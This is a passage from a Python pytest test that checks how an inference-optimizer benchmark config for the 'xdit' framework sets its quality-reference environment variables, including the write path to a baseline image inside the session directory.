    sess = tmp_path / "sess"
    monkeypatch.setenv("INFERENCE_OPTIMIZER_CURRENT_SESSION_DIR", str(sess))
    src = _write(tmp_path / "cfg.yaml", framework="xdit", envs={})
    bench = _materialize(src, tmp_path / "out", establish_quality_ref=True)
    expected = str(sess / "storage" / "quality_ref" / "baseline.png")
    assert bench["envs"]["XDIT_QUALITY_REF"] == ""
    assert bench["envs"]["XDIT_QUALITY_REF_WRITE"] == expected
